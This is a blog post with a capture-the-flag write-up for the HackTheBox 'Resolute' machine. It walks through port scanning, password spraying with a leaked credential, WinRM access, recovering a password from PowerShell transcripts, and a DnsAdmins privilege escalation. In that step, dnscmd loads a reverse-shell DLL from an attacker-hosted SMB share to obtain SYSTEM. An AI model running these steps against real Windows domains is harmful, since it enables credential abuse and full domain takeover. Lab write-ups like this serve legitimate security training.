---
layout: post
title:	"Resolute Writeup"
date:	2020-06-06
categories:
    - blog
tags:
    - hackthebox
---

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img1.png)

I had some problems the last week and couldn't publish this report I wrote in Decembre.

### User Flag

Let’s start by enumerating all the service on the machine with a TCP scan:

~~~
root@kali:~# nmap -T4 -sS 10.10.10.169 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 06:56 EDT
Nmap scan report for 10.10.10.169
Host is up (0.056s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49687/tcp open  unknown
49709/tcp open  unknown
49873/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 38.71 seconds

~~~

Using enum4linux, we find a lot of users:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img2.png)

There is an interesting Description for the user Marko, it seems that the Administrator have put the user password in the description.
Using the credenziali marko:Welcome123! We are not able to log in smb:


~~~
root@kali:~# smbclient -L \\10.10.10.169 -U marko
Enter WORKGROUP\marko's password: 
session setup failed: NT_STATUS_LOGON_FAILURE

~~~

We can try to save all the users in a file and then use the same password for all of them. For this purpose, I used Crack Map Exec.

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img3.png)

And yes, we have an access for the user melanie. Using [evil-winrm](https://github.com/Hackplayers/evil-winrm), we can open a powershell sessione on the machine.

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img4.png)

After some enumeration, we can find a hidden directory PSTranscripts in C:\.

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img5.png)

Inside the subdirectory 20191203 there is a txt file:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img6.png)

The file contains the password for the user ryan:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img7.png)

### Root Flag

With evilwinrm, we can access as ryan. The user ryan, is member of the group “MEGABANK\DnsAdmins”. There is a famous privilege escalation when an user is member of DnsAdmins, the attack is described [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise). We need to create our custom DLL, we can use msfvenom to create a reverse shell in a DLL file:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img8.png)

Then, we can use Impacket to run a smb server to share our custom DDL:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img9.png)

Inject our custom DLL and stop and run again the dns service with the following command:

~~~
dnscmd Resolute /config /serverlevelplugindll \\10.10.14.27\SYRION\syrion.dll
sc.exe \\Resolute stop dns
sc.exe \\Resolute start dns
~~~

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img10.png)

And we get a reverse shell with System privilege:

![Screenshot]({{ site.baseurl }}/images/2020-06-06-htb-resolute/img11.png)



